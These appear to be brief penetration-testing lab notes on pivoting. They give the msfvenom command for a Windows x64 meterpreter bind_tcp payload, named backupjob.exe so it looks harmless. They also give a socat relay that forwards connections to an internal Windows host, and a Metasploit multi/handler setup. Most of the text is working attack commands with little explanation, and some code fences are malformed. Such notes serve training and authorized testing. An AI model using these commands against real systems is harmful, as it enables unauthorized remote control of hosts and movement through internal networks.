**Overview:**
In the case of bind shells, the Windows server will start a listener and bind to a particular port. We can create a bind shell payload for Windows and execute it on the Windows host. At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.

---
	
	```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
We can create a bind shell using msfvenom

```
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
```
```
start a `socat bind shell` listener, which listens on port `8080` and forwards packets to Windows server `8443`.

```
msf6 > use exploit/multi/handler
```
We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.
